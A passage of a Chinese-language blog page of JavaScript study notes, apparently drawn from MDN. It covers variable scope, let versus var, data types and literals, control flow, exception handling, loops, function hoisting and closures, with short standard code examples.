一个包含DOM文档的窗口。其`document`属性指向窗口中载入的DOM文档。">[1]</span></a></sup>。所以可以使用如<code>windows.</code>*<code>variable</code>*的语法来设置和访问全局变量。</p></li><li><p>在<strong>函数内部</strong>声明的变量——<strong>局部变量</strong>。只可在当前函数的内部使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>  <span class="hljs-keyword">let</span> y = <span class="hljs-number">5</span>;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y); <span class="hljs-comment">// ReferenceError: y 没有被声明</span><br></code></pre></td></tr></table></figure></li></ul><p>先使用变量，后声明——<strong>变量提升</strong>。</p><ul><li>var输出undefined</li><li>在ECMAScript6中，let、const在声明前引用会抛出错误（Reference）。</li></ul><p>函数也可进行<strong>函数提升</strong>（函数表达式不可）。</p><p>常量的命名规则和变量相同（详见变量命名规则）。</p><p>在统一作用域内，<strong>不能使用和变量名或函数名相同的名字</strong>来命名常量。</p><p>对象属性和数组被赋值&#x2F;定义为常量时是<strong>不受保护</strong>的。</p><h4 id="let和var的区别"><a href="#let和var的区别" class="headerlink" title="*let和var的区别"></a>*let和var的区别</h4><ul><li>var声明变量时，是全局的。若在函数内声明，则是局部声明。</li><li>let与var相似。但在块、语句或表达式中使用let声明变量时，其作用域仅限于该快、语句或表达式。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> printNumTwo;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>  <span class="hljs-keyword">if</span> (i === <span class="hljs-number">2</span>) &#123;<br>    printNumTwo = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> i;<br>    &#125;;<br>  &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">printNumTwo</span>()); <span class="hljs-comment">//3</span><br></code></pre></td></tr></table></figure><p>输出3。因为赋值给i的值被更新了，printNumTwo()返回了全局i，而不是for循环中创建函数时的值。</p><p>let则不遵循这一行为。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> printNumTwo;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>  <span class="hljs-keyword">if</span> (i === <span class="hljs-number">2</span>) &#123;<br>    printNumTwo = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> i;<br>    &#125;;<br>  &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">printNumTwo</span>()); <span class="hljs-comment">//2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i); <span class="hljs-comment">//ReferenceError: i is not defined</span><br></code></pre></td></tr></table></figure><p>此处的i并不是全局变量。它只被声明在for循环中。</p><h3 id="数据结构和类型"><a href="#数据结构和类型" class="headerlink" title="数据结构和类型"></a>数据结构和类型</h3><p>目前的ECMAScript标准定义了8种数据类型：</p><ul><li><strong>基本数据类型</strong>（7种）<ul><li><strong>布尔值Boolean</strong>。值为true、false。</li><li><strong>null</strong>。一个表示null值的特殊关键字。<ul><li>因为js大小写敏感。所以null、Null、NULL或变体完全不同。</li></ul></li><li><strong>undefined</strong>。一个特殊关键字，表示变量未赋值时的属性。</li><li><strong>数字Number</strong>。整数或浮点数。</li><li><strong>任意精度的整数BigInt</strong>。安全地存储和操作大整数。</li><li><strong>字符串String</strong>。一串表示文本值的字符序列。</li><li><strong>代表Symbol</strong>。ES6新增类型。一种实例是唯一且不可改变的数据类型</li></ul></li><li><strong>对象Object</strong></li></ul><p>js是一种<strong>动态类型语言</strong>。声明变量时可以不指定数据类型，数据类型会在代码执行时自动转换。</p><ul><li><p><u>数字</u>转换为<u>字符串</u></p><ul><li>使用加法运算符+。（涉及其他运算符不会转为字符串）</li></ul></li><li><p><u>字符串</u>转换为<u>数字</u></p><ul><li><p><code>parseInt() </code>——该方法只能返回整数</p></li><li><p><code>parseFloat()</code></p></li><li><p>使用<strong>一元加法运算符</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;1.1&quot;</span> + <span class="hljs-string">&quot;1.1&quot;</span> = <span class="hljs-string">&quot;1.11.1&quot;</span><br>(+<span class="hljs-string">&quot;1.1&quot;</span>) + (+<span class="hljs-string">&quot;1.1&quot;</span>) = <span class="hljs-number">2.2</span><br><span class="hljs-comment">// 注意：加入括号为清楚起见，不是必需的。</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><p><strong>字面量literal</strong>：脚本中按字面意思给出的固定的值。</p><ul><li><p><strong>数组</strong>字面量：封闭在方括号对中的，包含零个或多个表达式的列表</p><p>当使用数组字面值创建一个数组时，该数组将会以指定的值作为其元素进行初始化，而其长度被设定为元素的个数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> myList = [<span class="hljs-string">&quot;home&quot;</span>, , <span class="hljs-string">&quot;school&quot;</span>];<br></code></pre></td></tr></table></figure><p>myList的长度为3，myList[0]为home，myList[1]为undefined，myList[2]为school。</p><p>最好<strong>显式地将缺失元素声明为<code>undefined</code>，</strong>能提高代码的清晰度和可维护性。</p></li><li><p><strong>布尔</strong>字面量：两种字面值。true和false。</p><p>注意：**<code>Boolean</code>** 对象是一个布尔值的对象包装器，在传递给条件语句时都将计算为true。不要和布尔值混淆。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> x = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (x) &#123;<br>  <span class="hljs-comment">// 这里的代码会被执行</span><br>&#125;<br><span class="hljs-keyword">const</span> y = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span> (y) &#123;<br>  <span class="hljs-comment">// 这里的代码不会执行</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>数字</strong>字面量</p><ul><li><p><strong>整数</strong>字面量。例如十进制、十六进制（0x或0X开头）、八进制（ 0或 0O或0o开头）以及二进制（0b或0B开头）。</p><p>严格模式下，八进制不能以0开头。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">0</span>, <span class="hljs-number">117</span> <span class="hljs-keyword">and</span> -<span class="hljs-number">345</span> (十进制，基数为 <span class="hljs-number">10</span>)<br><span class="hljs-number">015</span>, <span class="hljs-number">0001</span> <span class="hljs-keyword">and</span> -<span class="hljs-number">0o77</span> (八进制，基数为 <span class="hljs-number">8</span>)<br><span class="hljs-number">0x1123</span>, <span class="hljs-number">0x00111</span> <span class="hljs-keyword">and</span> -<span class="hljs-number">0xF1A7</span> (十六进制，基数为 <span class="hljs-number">16</span> 或<span class="hljs-string">&quot;hex&quot;</span>)<br><span class="hljs-number">0b11</span>, <span class="hljs-number">0b0011</span> <span class="hljs-keyword">and</span> -<span class="hljs-number">0b11</span> (二进制，基数为 <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure></li><li><p><strong>浮点数</strong>字面量。</p><p>组成</p><ul><li>一个十进制整数（可带正负号前缀<code>+</code>或<code>-</code>）</li><li>小数点</li><li>小数部分（一串十进制数）</li><li>指数部分（以e或E开头，后面跟整数，可有正负号）</li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">3.1415926<br><span class="hljs-title">.123456789</span><br>3.1E+12<br><span class="hljs-title">.1e-23</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>对象</strong>字面量：封闭在花括号对中的一个对象的零个或多个<code>属性/值</code>对的元素列表。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> car = &#123; <span class="hljs-attr">myCar</span>: <span class="hljs-string">&quot;Saturn&quot;</span>, <span class="hljs-attr">getCar</span>: <span class="hljs-title class_">CarTypes</span>(<span class="hljs-string">&quot;Honda&quot;</span>), <span class="hljs-attr">special</span>: <span class="hljs-title class_">Sales</span> &#125;;<br></code></pre></td></tr></table></figure><p>对象的属性名可以是任意字符串（包括空串）。</p><p>若属性名不是合法的js标识符，要用引号包裹（访问时不能用<code>.</code>，要用方括号）。</p><ul><li><p>在ES2015，对象字面值扩展支持在创建时设置原型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> obj = &#123;<br>  <span class="hljs-comment">// __proto__</span><br>  <span class="hljs-attr">__proto__</span>: theProtoObj,<br>  <span class="hljs-comment">// Shorthand for ‘handler: handler’</span><br>  handler,<br>  <span class="hljs-comment">// Methods</span><br>  <span class="hljs-title function_">toString</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// Super calls</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;d &quot;</span> + <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">toString</span>();<br>  &#125;,<br>  <span class="hljs-comment">// Computed (dynamic) property names</span><br>  [<span class="hljs-string">&quot;prop_&quot;</span> + (<span class="hljs-function">() =&gt;</span> <span class="hljs-number">42</span>)()]: <span class="hljs-number">42</span>,<br>&#125;;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>RegExp</strong> 字面值：一个正则表达式是字符被正斜杠<code>/</code>围成的表达式。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> re = <span class="hljs-regexp">/ab+c/</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>字符串</strong>字面量：由单引号或双引号括起来的零个或多个字符。</p><ul><li><p>字符串中使用的特殊字符</p><table><thead><tr><th>字符</th><th>意思</th></tr></thead><tbody><tr><td>\0</td><td>Null 字节</td></tr><tr><td>\b</td><td>退格符</td></tr><tr><td>\f</td><td>换页符</td></tr><tr><td>\n</td><td>换行符</td></tr><tr><td>\r</td><td>回车符</td></tr><tr><td>\t</td><td>Tab (制表符)</td></tr><tr><td>\v</td><td>垂直制表符</td></tr><tr><td>&#39;</td><td>单引号</td></tr><tr><td>&quot;</td><td>双引号</td></tr><tr><td>\</td><td>反斜杠字符（\）</td></tr><tr><td>\XXX</td><td>由从 0 到 377 <u>最多三位</u><strong>八进制数</strong>XXX表示的 <strong>Latin-1</strong> 字符。例如，\251 是版权符号的八进制序列。</td></tr><tr><td>\xXX</td><td>由从 00 和 FF 的<u>两位</u><strong>十六进制数</strong> XX 表示的 <strong>Latin-1</strong> 字符。例如，\xA9 是版权符号的十六进制序列。</td></tr><tr><td>\uXXXX</td><td>由<u>四位</u><strong>十六进制数</strong>字 XXXX 表示的 <strong>Unicode</strong> 字符。例如，\u00A9 是版权符号的 Unicode 序列。见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Lexical_grammar#string_literals">Unicode escape sequences</a> (Unicode 转义字符).</td></tr><tr><td>\u*{XXXXX} *</td><td>Unicode 代码点 (code point) 转义字符。例如，\u{2F804} 相当于 Unicode 转义字符 \uD87E\uDC04 的简写。</td></tr></tbody></table></li><li><p>转义字符：<code>\</code></p></li><li><p>模板字面量：<code>``</code> (ES2015新增)</p></li></ul></li></ul><h2 id="1-2流程控制与错误处理"><a href="#1-2流程控制与错误处理" class="headerlink" title="1.2流程控制与错误处理"></a>1.2流程控制与错误处理</h2><blockquote><p>JavaScript 提供一套灵活的语句集，特别是控制流语句，你可以用它在你的应用程序中实现大量的交互性功能。</p></blockquote><p><strong>语句块</strong>：用一对大括号<code>&#123;&#125;</code>界定。</p><ul><li>语句块常用于流程控制，如<code>if</code>,<code>for</code>,<code>while</code>等。</li><li>ES6之前没有块作用域。之后使用let和const是块作用域的。</li></ul><h3 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h3><ul><li><p><strong>if…else</strong>语句</p><p>判断条件真假。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (condition_1) &#123;<br>  statement_1;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (condition_2) &#123;<br>  statement_2;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (condition_n_1) &#123;<br>  statement_n;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  statement_last;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>如果条件表达式中使用赋值，通常在赋值语句前后额外加一对括号</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> ((x = y)) &#123;<br>  <span class="hljs-comment">/* statements here */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>会被计算为false的值</p><ul><li><code>false</code></li><li><code>undefined</code></li><li><code>null</code></li><li><code>0</code></li><li><code>NaN</code></li><li>空字符串（<code>&quot;&quot;</code>）</li></ul></li></ul></li><li><p><strong>switch</strong>语句</p><p>匹配表达式的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">switch</span> (expression) &#123;<br>   <span class="hljs-keyword">case</span> <span class="hljs-attr">label_1</span>:<br>      statements_1<br>      [<span class="hljs-keyword">break</span>;]<br>   <span class="hljs-keyword">case</span> <span class="hljs-attr">label_2</span>:<br>      statements_2<br>      [<span class="hljs-keyword">break</span>;]<br>   ...<br>   <span class="hljs-attr">default</span>:<br>      statements_def<br>      [<span class="hljs-keyword">break</span>;]<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>可以用<code>throw</code>语句抛出一个异常，并用<code>try…catch</code>语句捕获处理它。</p><ul><li><p><strong>throw</strong>语句</p><p>使用throw语句<strong>抛出一个异常</strong>。</p><p>需要规定一个含有值的表达式被抛出。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">throw</span> expression;<br><br><span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Error2&quot;</span>; <span class="hljs-comment">// String type</span><br><span class="hljs-keyword">throw</span> <span class="hljs-number">42</span>; <span class="hljs-comment">// Number type</span><br><span class="hljs-keyword">throw</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// Boolean type</span><br><span class="hljs-keyword">throw</span> &#123;<br>  <span class="hljs-attr">toString</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I&#x27;m an object!&quot;</span>;<br>  &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p><strong>try…catch</strong>语句</p><p>抛出异常时，try…catch语句捕获它。</p><ul><li><strong>catch</strong>块用于<strong>处理try块中产生的异常</strong>。</li><li><strong>finally</strong>块<strong>无论是否抛出异常都会执行</strong>。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">openMyFile</span>();<br><span class="hljs-keyword">try</span> &#123;<br>  <span class="hljs-title function_">writeMyFile</span>(theData); <span class="hljs-comment">//This may throw a error</span><br>&#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>  <span class="hljs-title function_">handleError</span>(e); <span class="hljs-comment">// If we got a error we handle it</span><br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>  <span class="hljs-title function_">closeMyFile</span>(); <span class="hljs-comment">// always close the resource</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>error</strong>对象</p><p><strong><code>Error()</code></strong> 构造函数能够创建一个包含错误信息的对象。</p><p>根据错误类型，可以使用error构造函数，用参数提供更精炼的信息。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">doSomethingErrorProne</span> () &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">ourCodeMakesAMistake</span>()) &#123;<br>    <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;The message&#x27;</span>));<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_">doSomethingToGetAJavascriptError</span>();<br>  &#125;<br>&#125;<br>....<br><span class="hljs-keyword">try</span> &#123;<br>  <span class="hljs-title function_">doSomethingErrorProne</span>();<br>&#125;<br><span class="hljs-keyword">catch</span> (e) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">name</span>); <span class="hljs-comment">// logs &#x27;Error&#x27;</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">message</span>); <span class="hljs-comment">// logs &#x27;The message&#x27; or a JavaScript error message)</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="1-3循环和迭代"><a href="#1-3循环和迭代" class="headerlink" title="1.3循环和迭代"></a>1.3循环和迭代</h2><blockquote><p>JavaScript 中提供了这些循环语句：</p><p>for 语句、do…while 语句、while 语句、label 语句、break 语句、continue 语句、for…in 语句、for…of 语句</p></blockquote><ul><li><p><strong>for</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">for</span> ([initialExpression]; [condition]; [incrementExpression])<br>  statement<br></code></pre></td></tr></table></figure><p>过程：</p><ol><li>若有<code>initialExpression</code>，执行。通常该表达式会初始化循环计数器。</li><li>计算<code>condition</code>表达式的值，true则循环，fasle循环终止</li><li>执行statement</li><li>若有<code>incrementExpression</code>，执行</li><li>回到步骤2</li></ol></li><li><p><strong>do…while</strong></p><p>一直执行直到condition为假。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">do</span><br>  statement<br><span class="hljs-keyword">while</span> (condition);<br></code></pre></td></tr></table></figure></li><li><p><strong>while</strong></p><p>condition为真就一直执行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">while</span> (condition)<br>  statement<br></code></pre></td></tr></table></figure></li><li><p><strong>label</strong></p><p>一个位置标识符。可以用label表示一个循环，然后使用break或continue来控制循环继续或停止。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">label :<br>   statement<br></code></pre></td></tr></table></figure></li><li><p><strong>break</strong></p><p>用于终止循环、switch或链接到label语句。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">break</span> [label];<br></code></pre></td></tr></table></figure></li><li><p><strong>continue</strong></p><p>继续执行（跳过代码块剩余部分进行下一循环）一个while、do-while、for或label语句。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">continue</span> [label];<br></code></pre></td></tr></table></figure></li><li><p><strong>for…in</strong></p><p>循环一个<strong>指定变量</strong>来循环一个对象的所有可枚举属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">for</span> (variable <span class="hljs-keyword">in</span> object) &#123;<br>  statements<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>数组更建议使用传统的for循环迭代。</li></ul></li><li><p><strong>for…of</strong></p><p>语句在<strong>可迭代对象</strong>（包括Array、Map、Set、argument等）上创建一个循环，对值的每一个<strong>独特属性</strong>进行一次迭代。</p><ul><li><p>for…of和for…in的区别</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> arr = [<span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>];<br>arr.<span class="hljs-property">foo</span> = <span class="hljs-string">&quot;hello&quot;</span>;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i <span class="hljs-keyword">in</span> arr) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i); <span class="hljs-comment">// 输出 &quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;foo&quot;</span><br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i <span class="hljs-keyword">of</span> arr) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i); <span class="hljs-comment">// 输出 &quot;3&quot;, &quot;5&quot;, &quot;7&quot;</span><br>&#125;<br><span class="hljs-comment">// 注意 for...of 的输出没有出现 &quot;hello&quot;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="1-4函数"><a href="#1-4函数" class="headerlink" title="1.4函数"></a>1.4函数</h2><blockquote><p>函数是 JavaScript 中的基本组件之一。</p><p>JavaScript 中的函数类似于过程——一组执行任务或计算值的语句。</p><p>但要成为函数，这个过程应该接受输入并返回与输入存在某些明显关系的输出。</p><p>要使用一个函数，你必须将其定义在你希望调用它的作用域内。</p></blockquote><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><p>一个<strong>函数定义</strong>（也叫函数声明）由<strong>function</strong>关键字，和以下部分组成：</p><ul><li><strong>函数名称</strong></li><li><strong>函数参数列表</strong>（括号内用逗号分隔）</li><li><strong>定义函数的JavaScript语句</strong>。</li></ul><p>参数本质上是<strong>按值</strong>传递给函数。所以函数体的代码为传递给函数的参数赋了新值，<strong>这个改变也不会反映到全局或调用该函数的代码中</strong>。</p><p><strong>函数表达式</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> function_expression = <span class="hljs-keyword">function</span> [name]([param1[, param2[, ..., paramN]]]) &#123;<br>   statements<br>&#125;;<br></code></pre></td></tr></table></figure><p>这样的函数可以是<strong>匿名的</strong>。</p><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>定义函数并不会执行它，只有调用给定参数后才是真正的执行。</p><p><strong>调用函数</strong>：<code>函数名();</code></p><p>调用时要在作用域内。但函数的声明可以被提升。</p><p>函数的参数可以是字符串、数字、整个对象或者是它本身。</p><p>实际上<strong>每个函数都是一个Function对象</strong>。</p><h3 id="函数提升"><a href="#函数提升" class="headerlink" title="函数提升"></a>函数提升</h3><p>JavaScript解释器会将整个函数声明提升到当前作用域的顶部。</p><p>因此这段代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">square</span>(<span class="hljs-number">5</span>)); <span class="hljs-comment">// 25</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">square</span>(<span class="hljs-params">n</span>) &#123;<br>  <span class="hljs-keyword">return</span> n * n;<br>&#125;<br></code></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 所有函数声明实际上都位于作用域的顶部</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">square</span>(<span class="hljs-params">n</span>) &#123;<br>  <span class="hljs-keyword">return</span> n * n;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">square</span>(<span class="hljs-number">5</span>)); <span class="hljs-comment">// 25</span><br></code></pre></td></tr></table></figure><p>注意：函数提升<strong>仅适用于函数声明</strong>，而不适用于函数表达式。</p><h3 id="作用域和函数栈"><a href="#作用域和函数栈" class="headerlink" title="作用域和函数栈"></a>作用域和函数栈</h3><p>定义在全局域中的函数可以访问所有定义在全局域中的变量。</p><p>函数可以访问其<strong>父函数中定义的</strong>所有变量和<strong>父函数有权访问</strong>的任何其他变量。</p><h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><p>调用自身的函数——<strong>递归函数</strong>。</p><p>一个函数可以指向并调用自身。有三个方法：</p><ol><li><strong>函数名</strong></li><li><strong>arguments.callee（不推荐使用）</strong></li><li><strong>作用域内一个指向该函数的变量名</strong></li></ol><p>例如以下函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> foo = <span class="hljs-keyword">function</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 这里编写语句</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>在该函数内，以下语句是等价的：</p><ol><li><code>bar()</code></li><li><code>arguments.callee()</code></li><li><code>foo()</code></li></ol><h4 id="嵌套函数和闭包"><a href="#嵌套函数和闭包" class="headerlink" title="嵌套函数和闭包"></a>嵌套函数和闭包</h4><p>可以在函数里嵌套另外一个函数。</p><p>它的自身形成一个闭包。</p><ul><li>闭包是可以拥有独立变量以及绑定了这些变量的环境（“封闭”了表达式）的表达式（通常是函数）</li><li>当内部函数以某一种方式被任何一个外部函数之外的任何作用域访问时，就会创建闭包。</li></ul><p>总结：</p><ul><li>内部函数只能在外部函数中访问</li><li>内部函数形成闭包，他可以访问外部函数的参数和变量，但外部函数不能使用它的参数和变量。</li></ul><p>当统一作用域下两个参数或者变量同名时，会产生<strong>命名冲突</strong>。最近的优先级最高，最远的最低。</p><h3 id="arguments对象"><a href="#arguments对象" class="headerlink" 